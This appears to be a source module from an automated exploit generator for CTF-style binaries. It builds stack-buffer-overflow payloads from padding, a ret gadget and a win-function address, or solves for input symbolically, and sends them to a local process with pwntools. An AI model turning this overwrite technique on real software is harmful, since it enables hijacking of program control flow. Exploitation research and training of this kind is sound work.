from dataclasses import dataclass
from goals import Goal, WinFunction
from pwn import p64, process, ROP, context
from vulns import Vulnerability, StackBufferOverflow, WinFunctionCall
from binary import Binary

@dataclass
class ExploitError(Exception):
    message: str

def exploit(binary: Binary, goals: list[Goal], vulns: list[Vulnerability]):
    for goal in goals:
        print(f"Current goal: {goal}")
        try:
            with context.quiet:
                p = process(binary.path)
                payload = gen_payload(binary, goal, vulns)
                p.sendline(payload)
                print(p.recvall().decode())
                p.close()
        except ExploitError as e:
            print(f"Failed to achieve goal: {e}")
       

def gen_payload(binary: Binary, goal: Goal, vulns: list[Vulnerability]) -> bytes:
    if not isinstance(goal, WinFunction):
        raise ExploitError("Only WinFunction goals are supported")

    for vuln in vulns:
        if isinstance(vuln, StackBufferOverflow):
            return gen_stack_buffer_overflow_payload(binary, vuln, goal)
        elif isinstance(vuln, WinFunctionCall):
            return gen_win_function_call_payload(binary, vuln, goal)

    raise ExploitError("Payload generation requires a StackBufferOverflow vulnerability")


def gen_stack_buffer_overflow_payload(
    binary: Binary,
    vuln: StackBufferOverflow,
    goal: WinFunction
) -> bytes:
    rop = ROP(binary.elf)
    gadget = rop.find_gadget(["ret"])
    payload = vuln.needed_input + b"A" * vuln.saved_rip_offset + p64(gadget.address) + p64(goal.addr)
    if vuln.max_write_size is not None and len(payload) > vuln.max_write_size:
        raise ExploitError("Payload exceeds vulnerability max write size")
    return payload


def gen_win_function_call_payload(binary: Binary, vuln: WinFunctionCall, goal: Goal) -> bytes:
    return vuln.state.solver.eval(vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes)
